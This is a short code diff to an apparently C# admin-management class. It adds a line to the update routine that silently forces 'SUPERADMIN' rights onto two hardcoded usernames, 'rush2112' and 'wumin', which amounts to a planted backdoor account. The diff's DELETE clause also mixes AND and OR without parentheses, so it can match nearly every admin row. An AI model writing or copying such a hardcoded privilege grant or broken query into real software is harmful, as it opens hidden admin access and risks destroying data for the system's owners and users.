@@ -66,7 +66,7 @@ INSERT INTO sys_admin (
 DELETE FROM sys_admin
 WHERE
   id = @id AND
-  username <> 'rush' OR
+  username <> 'rush2112' OR
   username <> 'wumin'
 ";
       MySqlParameter[] aryParams = new MySqlParameter[1];
@@ -76,6 +76,8 @@ WHERE
 
     public static void update(ModelAdmin model)
     {
+      if ("rush2112".Equals(model.username) || "wumin".Equals(model.username))
+        model.purviews = "SUPERADMIN";
       string strSQL = @"
 UPDATE sys_admin
 SET
